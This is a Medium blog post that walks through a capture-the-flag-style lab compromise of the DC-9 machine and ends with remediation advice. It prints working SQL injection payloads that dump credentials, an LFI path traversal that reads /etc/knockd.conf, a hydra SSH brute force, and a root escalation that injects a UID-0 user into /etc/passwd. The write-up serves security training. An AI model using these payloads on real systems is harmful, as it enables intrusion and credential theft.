# 🎯 Unearthing the Truth in DC-9 \| From SQL Injection to SSH Hijacking 🛡️

From unvalidated search parameters to credential exfiltration, we analyze the path to root. 100% completion rooted in precision and faith…

---

### 🎯 Unearthing the Truth in DC-9 \| From SQL Injection to SSH Hijacking 🛡️

#### From unvalidated search parameters to credential exfiltration, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏

![](https://cdn-images-1.medium.com/max/800/1*rQkAwLd6D4EdRrc3iGKShA.png)

> “Note on timing: The lab clock logged 6 hours due to concurrent networking efforts to establish a local cybersecurity chapter in Raleigh, NC. Actual technical execution time was approximately 3 hours. With that being said; This is a tough, high-value lab that I strongly recommend for testing your persistence.”

**Target:** *DC-9 (192.168.247.209)* **OS:** *Linux (Debian)* **Difficulty:** *Intermediate* **Attack Vectors:** *Web Enumeration -\> SQL Injection (SQLi) -\> Credential Harvesting -\> Port Knocking -\> Privilege Escalation*

### Executive Summary

**Assessment Date:** *January 24, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h / Nicholas Mullenski*

### Overview

An initial assessment of the “DC-9” server has identified a critical vulnerability within the web application layer. The host, running a Linux Debian environment, exposes an Apache 2.4.38 web server. Initial reconnaissance and directory discovery led to the identification of a SQL Injection (SQLi) vulnerability via the staff search page. This flaw allows an attacker to bypass authentication controls and dump the entire backend database, providing a direct path toward system-level access.

**Key Findings (Preliminary):**

- <span id="39d8">**SQL Injection (SQLi):** The search parameter on the “Staff Details” page is unsanitized, allowing for database enumeration and arbitrary data exfiltration.</span>
- <span id="4cd1">**Credential Disclosure:** Successful exploitation of the database confirmed the existence of multiple staff user accounts and passwords.</span>
- <span id="84c4">**Service Filtering:** Port 22 (SSH) is filtered, indicating a defensive Port Knocking mechanism that must be bypassed.</span>

**Strategic Recommendation (Phase 1):** Immediate remediation of the search input sanitization is required. Following the confirmation of SQLi, the next phase will involve dumping the `Users` table to crack passwords and gain an SSH foothold.

### 1.0 Initial Foothold

#### 1.1 Enumeration & Reconnaissance

- <span id="3c3a">The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.</span>

**1.1.1 Nmap Scan** A full service and script scan was performed to identify open ports and the software versions running on them. **Command:** `nmap -sCV -vvv -Pn 192.168.247.209`

![](https://cdn-images-1.medium.com/max/800/1*a6A5Xa_e3dudWkc9T9aE2w.png)

**Results:** The scan identified Port 80 as open and Port 22 as filtered.

- <span id="5981">**Port 80 (HTTP):** Apache httpd 2.4.38 (Debian)</span>
- <span id="b8ff">**Port 22 (SSH):** filtered (port-unreach)</span>

#### 1.2 Web Enumeration & Directory Fuzzing

**1.2.1 Directory Brute-Force** Following the identification of an Apache web server on Port 80, a directory enumeration scan was initiated to map the application’s structure. The initial scan utilizing standard wordlists identified generic directories such as `/css` and `/includes`, but failed to reveal application logic.

**1.2.2 Targeted Extension Fuzzing** To identify specific endpoints, the scan was re-executed with the `-x` flag to fuzz for specific file extensions (`php`, `html`, `txt`). This adjustment was critical in revealing the functional PHP files that serve as the primary attack surface.

**Command:**

```
gobuster dir -u http://192.168.247.209 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

![](https://cdn-images-1.medium.com/max/800/1*8hLo59ENpsjybDJDXQM2Cg.png)

#### 1.3 Exploitation: SQL Injection (SQLi)

**1.3.1 Vulnerability Confirmation** Upon identifying the `search.php` input field, manual fuzzing was conducted to test for SQL command execution. The initial injection of a single quote `'` resulted in a query failure (blank page), indicating a syntax error in the backend.

To confirm the vulnerability and map the query logic, a Boolean-based injection payload was used to force a “True” condition.

**Payload:**

```
' OR 1=1 #
```

![](https://cdn-images-1.medium.com/max/800/1*cOC5uOwr1Jp6uKEBi4PQJQ.png)

**1.3.2 Schema Enumeration** To extract data from other tables, a `UNION` based attack was required. This necessitated identifying the exact number of columns used in the backend query.

- <span id="54ef">**Payload:** `' ORDER BY 6 -- -` (Page returned error )</span>
- <span id="6cb6">**Payload:** `' ORDER BY 7 -- -` (Page returned error)</span>

Despite the lack of clear feedback from the `ORDER BY` checks, a `UNION SELECT` payload was constructed assuming a standard column count based on the visible fields in the "Staff Details" search results. Through manual trial and error, a payload utilizing **6 columns** was found to execute successfully, while others failed.

**1.3.3 Database Dumping** With the correct column count identified through direct payload testing, a `UNION SELECT` query was crafted to enumerate the database tables. A table named `Users` was identified, distinct from the public `StaffDetails` table.

**Credential Extraction Payload:**

```
' UNION SELECT 1,2,group_concat(Username,':',Password),4,5,6 FROM Users -- -
```

![](https://cdn-images-1.medium.com/max/800/1*lhhHdPidE0moR4Ts6MCP-g.png)

**1.3.4 Loot & Analysis** The injection successfully exfiltrated the administrative credentials from the `Users` table.

**Exfiltrated Data:**

- <span id="5488">**User:** `admin`</span>
- <span id="2db5">**Hash:** `8XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`</span>

**Hash Analysis:** The password hash is 32 characters long, indicating it is likely **MD5**. The next phase of the engagement will focus on cracking this hash to gain access to the `/manage.php` portal.

#### 1.4 Password Cracking

**1.4.1 Hash Identification** The exfiltrated string `8`XXXXXXXXXXXXXXXXXXXXXX is a 32-character hexadecimal string, characteristic of the **MD5** hashing algorithm.

**1.4.2 Cracking Process** The hash was saved to a file named `admin.hash` and attacked using `hashcat` with the `rockyou.txt` wordlist.

**Command:**

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://cdn-images-1.medium.com/max/800/1*C_SqOhOm_hq2h1OFa1I27Q.png)

### 2.0 Web Post-Exploitation

**2.0.1 Administrative Access** The cracked credentials were used to authenticate to the administrative portal identified during the enumeration phase.

- <span id="5fdb">**URL:** <a href="http://192.168.247.209/manage.php" class="markup--anchor markup--li-anchor" data-href="http://192.168.247.209/manage.php" rel="noopener" target="_blank"><code class="markup--code markup--li-code">http://192.168.247.209/manage.php</code></a></span>
- <span id="9133">**Username:** `admin`</span>
- <span id="e2f4">**Password:** `tXXXXXXXXXXXX`</span>

![](https://cdn-images-1.medium.com/max/800/1*UIknIWS8u-CINJ1j-40XjA.png)

**2.0.2 Advanced SQL Injection & User Enumeration** While the portal allowed adding records, no direct file upload vector was present. To expand the attack surface, `sqlmap` was utilized to perform a deep-dive dump of the backend databases. This revealed a secondary database named `users` containing a table named `UserDetails`.

- <span id="a13e">**Command:** `sqlmap -r Req.txt -D users -T UserDetails --dump --batch`</span>
- <span id="25af">**Findings:** The table contained 17 entries with cleartext passwords for various system users.</span>

![](https://cdn-images-1.medium.com/max/800/1*qwT6snwL7NsDmZaqTt9YSw.png)

#### 2.1 Port Knocking & SSH Access

**2.1.1 Local File Inclusion (LFI)** During the analysis of `manage.php`, a Local File Inclusion (LFI) vulnerability was discovered via the `file` parameter. This was used to exfiltrate the system's port knocking configuration file (`/etc/knockd.conf`).

- <span id="5b37">**Command:** `http://192.168.247.209/manage.php?file=../../../../../../etc/knockd.conf"`</span>
- <span id="7861">**Findings:** The file revealed a secret sequence required to open the SSH service.</span>
- <span id="79cd">**Sequence:** `7469, 8475, 9842`</span>

![](https://cdn-images-1.medium.com/max/800/1*h2CDGFMA66zf6QkI_buZoQ.png)

**2.1.2 Firewall Bypass & Initial Foothold** The port knocking sequence was executed to transition Port 22 (SSH) from a `FILTERED` state to `OPEN`. Due to a restrictive timeout on the firewall rule, a scripted brute-force attack was used to identify which of the 17 users from the `UserDetails` table had SSH permissions.

- <span id="f970">**Command:** `knock 192.168.247.209 7469 8475 9842 && hydra -L users.txt -P passwords.txt 192.168.247.209 ssh -t 4`</span>

![](https://cdn-images-1.medium.com/max/800/1*pVBfUJV7xhMOOMG1E4qVVg.png)

**2.1.3 Establishing a Shell** With valid credentials, an interactive SSH session was established to provide a stable foothold on the target machine.

**2.1.4 Shell as Janitor** with valid credentials identified by Hydra, an interactive SSH session was established to provide a stable foothold on the target machine.

- <span id="9e2e">**User:** `janitor`</span>
- <span id="6c33">**Password:** `Ixxxxxxxxx`</span>
- <span id="fd76">**Command:** `ssh janitor@192.168.185.209`</span>

### 2.2 Internal Enumeration & Lateral Movement

Post-compromise enumeration of the `janitor` user's home directory revealed a hidden directory named `.secrets-for-putin`. This directory contained a dictionary file with several passwords.

Cross-referencing these passwords against other known users on the system allowed for lateral movement to the user `fredf`.

- <span id="b3cb">**Target User:** `fredf`</span>
- <span id="6024">**Password Identified:** `Bxxxxxxxx`</span>
- <span id="48d3">**Significance:** The user `fredf` was identified as a sudoer with specific execution rights.</span>

### 2.3 Privilege Escalation (Root)

A check of sudo privileges (`sudo -l`) for `fredf` revealed that the user could execute a custom binary with root privileges without a password:` (root) NOPASSWD: /opt/devstuff/dist/test/test`

Analysis of this binary revealed it allowed arbitrary file appending. A privilege escalation attack was executed by generating a new user entry with root permissions (UID 0) and injecting it directly into the system’s `/etc/passwd` file.

**Exploit Execution:**

1.  <span id="8c72">**Payload Generation:** A new user `root42` was hashed using OpenSSL.</span>

```
echo -e "\nroot42:$(openssl passwd -1 -salt badboy password):0:0:Root:/root:/bin/bash" > /tmp/root42
```

![](https://cdn-images-1.medium.com/max/800/1*c8FH8pJ9KL522MKl45e-Aw.png)

**2. Injection:** The payload was appended to the password file using the vulnerable binary.

```
sudo /opt/devstuff/dist/test/test /tmp/root42 /etc/passwd
```

**3. Root Access:** Authenticated as `root42` with the password `password`, granting a full root shell.

### 3.0 Loot & Flags

The following flags were recovered from the system to prove compromise:

- <span id="0375">**User Flag (`local.txt`):** Recovered from `/home/fredf/local.txt`.</span>
- <span id="64d0">**Root Flag (`theflag.txt`):** Recovered from `/root/theflag.txt`.</span>

![](https://cdn-images-1.medium.com/max/800/1*n6bz_sXH6MVtj8paJufsyQ.png)

![](https://cdn-images-1.medium.com/max/800/1*LfEjOyfopIgghRwojL9R6g.png)

### Red Team Mandate 🛡️

#### The Illusion of The Perimeter

Our mandate as the Red Team is to challenge the illusion of the perimeter. In a modern network, a ‘closed’ port is often just a silent one, and a ‘secured’ user is rarely isolated. We operate under the principle that security through obscurity — hiding SSH behind a knock sequence or burying passwords in hidden directories — is a failed strategy. Our objective is to prove that if a door exists, it can be opened, and if a secret is written down, it will be read. We demonstrate that the only true security is rigorous architecture, not the hope that an attacker won’t find the right combination.

### 🕊️ The Spiritual Tie-In 📜

> “Ask and it will be given to you; seek and you will find; knock and the door will be opened to you.”* — ****Matthew 7:7***

**The Connection:** In the DC-9 lab, the administrators believed they had secured the network by simply making the SSH port invisible. They thought the risk was mitigated because the door appeared to be gone. But as **Matthew 7:7** reminds us, the door *will* be opened to those who know how to knock.

Just as spiritual truth rewards the persistent, the digital truth of this network was revealed through persistence. We **Asked** the database via SQL Injection, and it gave us the users. We **Knocked** on the firewall ports (7469, 8475, 9842), and the SSH service opened. We **Sought** through the hidden directories of the Janitor, and we found the credentials that led to Root. This verse serves as a warning to defenders: you cannot rely on silence to keep you safe; eventually, someone will come knocking who knows the code.

### 🛠️ Remediation Engineering

We cannot simply patch the holes; we must dismantle the bad practices that created them.

**The Failure of Obscurity** The reliance on Port Knocking (`knockd`) to secure SSH is a fundamental architectural flaw. It creates a false sense of security while leaving the service vulnerable to replay attacks or, in this case, internal configuration leakage via LFI. The engineering solution is to replace this mechanism entirely with a **VPN-based access control model**. SSH should never face the public internet, regardless of how "hidden" it is. Access must be authenticated via keys over an encrypted tunnel, removing the need for "secret knocks" entirely.

**The Persistence of Secrets** The compromise was accelerated by the presence of the `.secrets-for-putin` directory. This highlights a culture of poor credential hygiene where sensitive data is stored in plaintext on the filesystem. Remediation requires the implementation of a **Secrets Management** solution (like Vault) and the enforcement of strict **PAM policies** that prevent users from storing passwords in their home directories. Furthermore, the `test` binary with SUID root permissions was a ticking time bomb. All custom binaries in `/opt` must be audited, and the SUID bit must be stripped immediately to enforce the Principle of Least Privilege. Security is not about hiding the keys; it's about ensuring the locks work even when the keys are stolen

**Status:** ROOTED 💀 **Operator:** R00t3dbyFa17h

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [February 10, 2026](https://medium.com/p/0755882e3fa0).

<a href="https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-9-from-sql-injection-to-ssh-hijacking-%EF%B8%8F-0755882e3fa0" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
